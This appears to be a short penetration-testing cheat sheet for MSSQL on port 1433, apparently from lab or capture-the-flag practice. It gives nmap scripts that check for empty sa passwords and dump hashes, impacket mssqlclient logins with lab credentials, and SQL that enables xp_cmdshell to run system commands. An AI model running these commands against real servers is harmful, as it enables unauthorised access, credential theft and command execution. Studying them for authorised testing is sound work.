# 1433 mssql


Basic Commands
```shell
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

msfconsole
use scanner/mssql/mssql_ping
set rhosts
run
```

Connecting with mssqlclient.py
```shell
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.208.220 -windows-auth

impacket-mssqlclient Administrator:Lab123@192.168.238.18 -windows-auth
```

mssqlclient commands (display databases)
```bash
SQL (ILF-SQL-01\backdoor  dbo@master)> select name from sys.databases
```

Using xp_cmdshell to get shell access
```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';

```
